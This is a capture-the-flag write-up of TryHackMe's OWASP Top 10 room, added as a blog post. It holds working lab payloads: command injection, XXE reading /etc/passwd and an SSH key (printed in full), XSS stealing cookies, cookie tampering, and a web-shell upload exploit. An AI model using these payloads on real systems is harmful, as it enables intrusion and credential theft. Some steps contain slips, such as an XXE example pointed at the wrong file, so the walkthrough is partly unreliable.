@@ -1,0 +1,413 @@
+---
+title: 'OWASP room by THM'
+date: '2023-11-10'
+lastmod: '2023-11-10'
+tags: ['THM', 'exploit', 'cybersecurity']
+summary: "Writeup for OWASP room by TryHackMe, about and exploit each of the OWASP Top 10 vulnerabilities"
+thumbnail: '/static/images/OWASP-2023/banner.png'
+images: ['/static/images/OWASP-2023/banner.png']
+authors: ['psga','maysu']
+layout: PostSimple
+---
+
+# OWASP10 TryHackme Write up
+
+## OS command Injection
+Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.  It's nowhere near finished but contains the same command injection vulnerability as before!  But this time, the response from the system call can be seen on the page!  They'll never learn!
+
+Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection.  See if you can figure it out.  I'll go over it below just as before.
+
+![image](https://hackmd.io/_uploads/BywRrGEr0.png)
+
+
+
+When we enter this page, we can see Evilshell where there is a box to enter text, here we can make an Active Command injection. With this we can be so to speak in the root directory.
+- **What strange text file is in the website root directory?**
+    - We can see this using the `ls` command. Here we will see that in addition to seeing the web server files there is a text file called **``drpepper.txt``**
+
+- **How ​​many non-root/non-service/non-daemon users are there?**
+    - We can do this by looking at the `\etc\passwd` file, here we will see that apparently there is no user other than a root user or a non-service user or a daemon. Therefore the answer would be **0**
+
+- **What user is this app running as?**
+    - To see the user you can use the `whoami` command, which is used to see which user we are in. When entering the command, we will see **`www-data`**, thus representing the user that is running in the app
+
+
+- **What is the user's shell set like this?**
+    - We saw this previously with the file ``passwd``, We see that the majority of users log in from **``/usr/sbin/nologin``**. For example ``www-data`` also enters from there, therefore we see that that is the shell that has been configured.
+
+- **What version of Ubuntu is running?**
+    - To see the kernel version we can use `uname -a` but we see that what we need is the OS version, which is Ubuntu. Our solution was to run the `hostnamectl` command which revealed Ubuntu version **18.04.4**
+
+- **Print out the MOTD. What favorite beverage is shown?**
+    - When investigating where motd is located on an Ubuntu system, you can find on the [official Ubuntu page](https://ubuntu.com/server/docs/pam-motd) that motd is located in the directory
+
+``/etc/update-motd.d/``
+If we look at the files inside this directory (``ls /etc/update-motd.d/*``) we can see one called **`00-header`** Viewing this file using:
+``cat /etc/update-motd.d/00-header``
+we can see something like
+`Welcome to Dr pepper..`
+Getting that the name of the drink
+
+---
+
+## Broken Authentication
+
+For this example, we'll be looking at a logic flaw within the authentication mechanism.
+
+A lot of times what happens is that developers forgets to sanitize the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit i.e re-registration of an existing user.
+
+Let's understand this with the help of an example, say there is an existing user with the name admin and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin"(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user admin.
+
+To see this in action go to http://10.10.244.55:8888 and try to register a user name darren, you'll see that user already exists so then try to register a user " darren" and you'll see that you are now logged in and will be able to see the content present only in Darren's account which in our case is the flag that you need to retrieve.
+
+
+
+- **What is the flag that you found in darren's account?**
+    - Seeing that the website has a poor development, we can create an account called 'darren ', we see that it is different from 'darren' since it has the difference of one space at the beginning. With this user created we can enter the `darren` account using this user (it is really the same but in the login the accounts are different). Given that the flag.
+    
+- **Now try to do the same trick and see if you can login as arthur.**
+    - In the same way it can be done with the user arthur. Then we have the flag
+
+---
+
+
+
+## Sensitive Data Exposure (Introduction)
+
+When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...
+
+The web application in this box contains one such vulnerability. Deploy the machine, then read through the supporting material in the following tasks as the box boots up.
+
+
+Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. 
+
+- **What is the name of the mentioned directory?**
+     - When access to the website and then access to the page code from the site `login` we can see a comment that reads as follow:
+```<!-- Must remember to do something better with the database than store it in /assets... -->```
+
+We see that the directory mentioned is `/assets`
+
+
+- **Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**
+    - when we access to the page, we found:
+```
+Index of /assets
+[ICO]    Name    Last modified    Size    Description
+[PARENTDIR]    Parent Directory         -
+[DIR]    css/    2020-07-14 17:52    -
+[DIR]    fonts/    2020-07-14 15:42    -
+[DIR]    images/    2020-07-14 15:42    -
+[DIR]    js/    2020-07-14 15:52    -
+[DIR]    php/    2020-07-14 15:42    -
+[   ]    webapp.db    2020-07-14 17:52    28K
+Apache/2.4.29 (Ubuntu) Server at 10.10.87.73 Port 80
+```
+
+The file called **``webapp.db``** is a db that may contain sensitive data.
+
+
+- **Use the supporting material to access the sensitive data. What is the password hash of the admin user?**
+    - We download the sensitive data and pass it to a SQLite program.
+With this we can see the admin password. This can be seen in the photo:
+
+![Dc1iV43](https://i.imgur.com/Dc1iV43.png)
+    
+the hash of the admin password is **6eea9b7ef19179a06954edd0f6c05ceb**. 
+ 
+- **What is the admin's plaintext password?**
+    - This password can be a weak password, if so, it can be in a db of cracked password.
+We can try putting the hash in a website like [Crackstation](https://crackstation.net/) and ... Bingo!, We found the plaintext password. Besides, we realize that the hash password is a **MD5 hash**.
+- **Login as the admin. What is the flag?!**
+    - then we enter the page and log in as the admin user. Thus finding the flag
+
+----
+
+## XML External Entity 
+
+- **Full form of XML**
+    - Extensible Markup Language
+
+- **Is it compulsory to have XML prolog in XML documents?**
+    - **No** this is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents
+    
+- **How can we specify XML version and encoding in XML document?**
+    - XML prolog, an example can be
+``<?xml version="1.0" encoding="UTF-8"?>`` as can be seen, in that line is ``version`` and ``encoding`` 
+
+
+- **Can we validate XML documents against a schema?**
+    - yes, XML allows validation using DTD and Schema.
+
+---
+
+## External Entity, DTD
+
+- **How do you define a new ELEMENT?**
+    - **!ELEMENT** note - Defines that the note element must contain the elements: "to, from, heading, body"
+
+- **How do you define a ROOT element?**
+
+    - **!DOCTYPE** note -  Defines a root element of the document named note
+
+- **How do you define a new ENTITY?**
+    - Its a bit intuitive. Is **!ENTITY**
+ 
+---
+
+
+## XML External Entity - XXE Payload
+
+```XML
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+ ```
+ 
+ We can see we are defining a `ENTITY` called `name` with the value `"feast"` Then, first name will be falcon and lastname will be feast which is the value of `name`
+ 
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+As we similar did in the previous case, we define a `ENTITY` called read is that we are setting it value to `SYSTEM`, and path of the file `passwd`
+
+---
+
+
+## XML External Entity - Exploiting
+
+- **Try to display your own name using any payload.**
+    - we can reuse this code: 
+```XML
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+ ```
+changing ``falcon`` for ``Pablo`` and ``name`` for ``Usuga``. That is simple
+
+
+- **What is the name of the user in /etc/passwd**
+    - if we use this code:
+```XML
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///bin/bash'>]>
+<root>&read;</root>
+```
+we can see the user called falcon in the last line
+`falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash`
+- **Where is falcon's SSH key located?**
+    - We know that the SSH keys are often stored in a user home directory called ``.ssh`` and usually the private key is called ``id_rsa``. then we supposed the falcon's SSH key is stored in ``/home/falcon/.ssh/id_rsa``
+     
+- **What are the first 18 characters for falcon's private key**
+    - So, we can search and read the private key or SSH key of falcon reusing the above xml code: 
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file://home/falcon/.ssh/id_rsa'>]>
+<root>&read;</root>
+```
+Thus achievining the complete RSA key 
+```
+-----BEGIN RSA PRIVATE KEY----- 
+
+MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB 2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5 bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya 6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g 83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm 9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ 9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
+
+-----END RSA PRIVATE KEY-----
+```
+
+---
+
+
+## IdOR Challenge
+IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
+
+For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.
+
+There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.
+
+
+- **Read and understand how IDOR works.**
+    - No answer needed
+    
+    Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.
+    A regular visitor being able to access protected pages, can lead to the following:
+    Being able to view sensitive information
+    Accessing unauthorized functionality
+
+- **Deploy the machine and go to http://10.10.5.197 - Login with the username being noot and the password test1234.**
+    - When we access to the website we can see a login page. Then, we put the info and we access
+Correct Answer
+
+
+- **Look at other users notes. What is the flag?**
+    - When we acces, we see in the page url this: http://10.10.5.197/note.php?note=1. We can change the url arbitrary and when the note is to 0 value the url, that is
+    http://10.10.5.197/note.php?note=1. We can see in the page the password.
+
+---
+
+
+## Security Misconfiguration
+Default Passwords
+Specifically, this VM focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.
+
+It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.
+
+It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.
+
+In October 2016, Dyn (a DNS provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.
+
+How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.
+
+The DDoS attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.
+**
+- Deploy the VM**
+    - When we access to the VM we can see a website called 'Pensive Notes'. with a log in div. 
+- **Hack into the webapp, and find the flag!**
+    - if you search the name of the website, you can find a github repository about this website and we can get some info from here, like:
+```
+After downloading and compiling PensiveNotes, log in using the default credentials pensive:PensiveNotes
+
+Make sure you change this password immediately!
+
+```
+Then after use this credentials we can see the flag! 
+
+---
+
+## Cross-site Scripting
+
+Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.
+
+A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:
+- Stored XSS - the most dangerous type ofXSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
+- Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
+- DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
+For more XSS explanations and exercises, check out the [XSS room](https://tryhackme.com/r/room/xss).
+
+
+- **Deploy the VM**
+    - We can access to the website of the VM. This website is called XSS playground. 
+
+- **Navigate to http://10.10.171.90/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".**
+    - we can create a XSS payload that make a popup saying "Hello" using
+    ```
+    <script>alert(“Hello”)</script>
+    ```
+    After of use we can see the popup saying "Hello" and the flag: ThereIsMoreToXSSThanYouThink
+
+    - On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
+    - We googled how to get the ip.address in javascript and we entered that ip adress is `window.location.hostname` after that we just put in a XSS popup and get `ReflectiveXss4TheWin`
+
+
+- **Now navigate to http://10.10.171.90/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.**
+    - When we acces to the Stored XSS subsite we entered that we need to register for use the chat. after to register, we can use XSS scripting in the chat for
+- **Then add a comment and see if you can insert some of your own HTML.** 
+    -We add a comment and insert some own HTML with XSS scripting. 
+    We just add some html tags in the chat, then We get the flag: HTML_T4gs
+
+- **On the same page, create an alert popup box appear on the page with your document cookies.**
+
+    - I search about the documents cookies in javascript and i realised that this is saved in the `document.cookie` variable. Then with XSS scripting and an alert we get the code
+
+     ```
+    <script>alert(document.cookie)</script>
+     ```
+
+- **Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.**
+    - We enter to inspect mode and we realized that tag of XSS Playground is ``#thm-title’`` with this we search and we can use this command
+```
+<script>document.querySelector(‘#thm-title’).textContent = ‘I am a hacker’</script>
+```
+then get the password
+
+---
+
+##  Insecure Deserialization - Cookies Practical
+
+When we access to the website, we can see the 
+ 
+ You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.
+
+Modifying Cookie Values
+Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.
+
+This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?
+
+Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://10.10.99.131/admin to answer the second flag.
+Answer the questions below
+- **1st flag (cookie value)**
+    - We can get the first flag accesing the cookies and seeing the 2 cookies that are base64 enconding, take 1 
+
+```
+base64 -D
+gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAY2RmZDU4OWFhNDkxNDBiNGJmZTM4NThmNTIxNjlmNThxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==
+```
+
+    the return is 
+```
+?}q(X    sessionIdqX cdfd589aa49140b4bfe3858f52169f58qX
+                                                      encodedflagqXTHM{good_old_base64_huh}qu.
+```
+See the password
+
+- **2nd flag (admin dashboard)**
+
+    - lets do what appears on the website, first we canchange de value of userType to admin. Then we can access to the admin website
+
+
+##  Insecure Deserialization - Code Execution
+Follow the page instructions, nothing to say!
+
+when you enter to the server, you can use 
+```
+find / -name flag.txt 2>/dev/null
+```
+
+After of this, we can see the directory of ``flag.txt``
+```
+/home/cmnatic/flag.txt
+```
+Then we can read this file
+
+```
+cat /home/cmnatic/flag.txt
+```
+
+---
+## Components With Known Vulnerabilities - Lab
+
+When we connect we see a page, which says that it is built with SQL and PHP. In more detail, when we try acces to a no exist subpage we get info, which says ```Apache 2.4.29```. 
+After searching for this in [exploit-db](https://www.exploit-db.com/) And getting nothing, we can search information in exploit-db or google. I search:
+
+```
+unauthenticated bookstore app rce's.
+```
+And i got the following websites
+[exploit from exploit-db](https://www.exploit-db.com/exploits/47887)
+[Projecto from Projectworlds](https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/)
+
+Download the script from the exploit-db and execute (*You can install the modules with pip *).
+You have to change the script and set the ip of the page.
+And then execute:
+```
+maysu@Maysus-MacBook-Air ~ % python3 exploit.py 'http://10.10.150.172' 
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.150.172/bootstrap/img/AFLEkOvLAR.php
+> Example command usage: http://10.10.150.172/bootstrap/img/AFLEkOvLAR.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y  
+RCE $ 
+```
+ 
+With the terminal we can write
+```
+wc -c /etc/passw
+```
+
+
+
